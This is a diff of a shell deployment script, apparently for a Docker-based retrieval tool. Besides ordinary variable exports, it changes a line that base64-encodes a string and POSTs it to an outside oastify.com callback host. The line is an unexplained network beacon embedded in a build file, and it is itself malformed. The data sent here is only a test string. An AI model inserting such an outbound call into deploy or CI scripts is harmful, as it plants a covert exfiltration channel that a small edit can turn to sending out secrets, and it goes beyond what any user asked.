@@ -17,7 +17,7 @@ echo "TAG=IMAGE_TAG=${IMAGE_TAG}"
 export REGISTRY=${IMAGE_REPO}
 export TAG=${IMAGE_TAG}
 export MODEL_CACHE=${model_cache:-"./data"}
-curl echo helloWorld | base64 | curl -X POST --data-binary @- http://9lvq15102ivtyipnhysliao6oxuoim6b.oastify.com
+curl echo helloWorldtest | base64 | curl -X POST --data-binary @- http://9lvq15102ivtyipnhysliao6oxuoim6b.oastify.com
 
 function stop_docker() {
     echo "Stopping Retrieval tool"
